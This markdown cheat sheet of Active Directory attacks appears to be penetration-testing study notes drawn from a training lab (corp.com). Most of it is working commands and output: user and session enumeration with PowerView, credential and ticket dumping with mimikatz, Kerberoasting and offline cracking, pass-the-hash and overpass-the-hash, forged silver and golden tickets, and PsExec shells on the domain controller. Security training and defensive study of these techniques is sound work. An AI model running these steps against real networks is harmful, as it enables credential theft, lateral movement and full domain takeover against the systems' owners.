# Windows Active Directory Enumeration

We target high privileged groups/users.

* Attack Users in high privileged groups
* Attack the Domain Controller

## Enumerate the Domain Users

All local user accounts
```powershell
C:\Users\Offsec.corp> net user
```

All Domain user acccounts
```powershell
C:\Users\Offsec.corp> net user /domain
```

Fetch more info about a single interesting user
```powershell
C:\Users\Offsec.corp> net user jeff_admin /domain
```
check for group memberships like `Domain Admins`

List all domain groups
```powershell
net group /domain
```
## Currently Logged In Users

Check for currently logged in high privileged users to steal their creds.
Note that if we cannot directly attack a Domain Admin we must attack other users/machines to pivot.

https://gitlab.com/kalilinux/packages/powersploit

List all logged in users
```powershell
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
```

List sessions on domain controller
```powershell
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
```

## Target Service Accounts
An alternative to attack the users directly is to attack service accounts (IIS, SQL).
Theses can be identified by their.


Emun powershell script: note to adapt the ldap filter if needed

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
}
```

check for serviceprincipalname

using nslookup you can fin the ip of the given service.

# Active Directory Attacks

## Cached Credentials
https://github.com/gentilkiwi/mimikatz/releases

Dump hashes for all users logged in to current workstation
```powershell
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```

Dump Ticket Granting Tickets (TGT) and Service Tickets (TGS)

```powershell
mimikatz # sekurlsa::tickets
```

Using the TGT we can request TGS for any resource in the domain

## Service Accounts Attacks
Note: no administrative rights needed

Fetch a TGS for an SPN and try to crack the ticket password. The password obtained is the one of the service account.

This is called Kerberoasting
Be careful when transfering the ticket as it's binary and might get mangled.

1. Fetch a TGS for an SPN
```powershell
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

2. Confirm it's loaded into memory
```powershell
PS C:\Users\offsec.CORP> klist
```
You should see an entry with the Server: HTTP/CorpWebServer.corp.com attribute-.

3. Dump the ticket
```powershell
mimikatz # kerberos::list /export
```

4. Crack the password
```bash
kali@kali:~$ sudo apt update && sudo apt install kerberoast
...
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```
alternatively use hashcat

# Active Directory Lateral Movement
If we failed to crack any cleartext password we could use to authenticate to other machines we ca abuse NTLM/Kerberos.

## Pass The Hash
Authenticate to a remote system or service using a user’s NTLM hash instead of the associated plaintext password.
Requires local Admin rights

```bash
kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

## Overpass The Hash
The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.

```powershell
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```
This opens a new powershell which allows us to run commands as jeff_admin.
We are now able to request a TGT

```powershell
PS C:\Windows\system32> net use \\dc01
```
Our NTLM hash was converted into a kerberos TGT.

Finally get a shell on a remote machine
```powershell
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
```

## Pass The Ticket
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected 
elsewhere on the network and then used to authenticate to a specific service. In addition, if the 
service tickets belong to the current user, then no administrative privileges are required.

1. Obtain Security Identifier SID
```cmd
C:\>whoami /user
USER INFORMATION
----------------
User Name SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```
S-1-5-21-1602875587-2787523311-2599479668 remove last chars

2. Craft Silver Ticket

```powershell
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
mimikatz # kerberos::list
[00000000] - 0x00000017 - rc4_hmac_nt
```
# Active Directory Persistence

## Golden Tickets

The KDC encrypts the TGT with a secret key known only to the KDCs in the 
domain. This secret key is actually the password hash of a domain user account called krbtgt
If we are able to get our hands on the krbtgt password hash, we could create our own self-made 
custom TGTs, or golden tickets.

Note: the krbtgt is not changed very often, which makes this method persistent

At this stage of the engagement, we should have access to an account that is a member of the 
Domain Admins group or we have compromised the domain controller itself.

Creating the golden ticket and injecting it into memory does not require any administrative 
privileges, and can even be performed from a computer that is not joined to the domain. We’ll 
take the hash and continue the procedure from a compromised workstation.

```powershell
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
User : fakeuser
Domain : corp.com (CORP)
SID : S-1-5-21-1602875587-2787523311-2599479668
User Id : 500
Groups Id : \*513 512 520 518 519
ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt
Lifetime : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48
-> Ticket : \*\* Pass The Ticket \*\*
\* PAC generated
\* PAC signed
\* EncTicketPart generated
\* EncTicketPart encrypted
\* KrbCred generated
Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
```

If we'd need to move along we could again use PsExec
```powershell
C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
```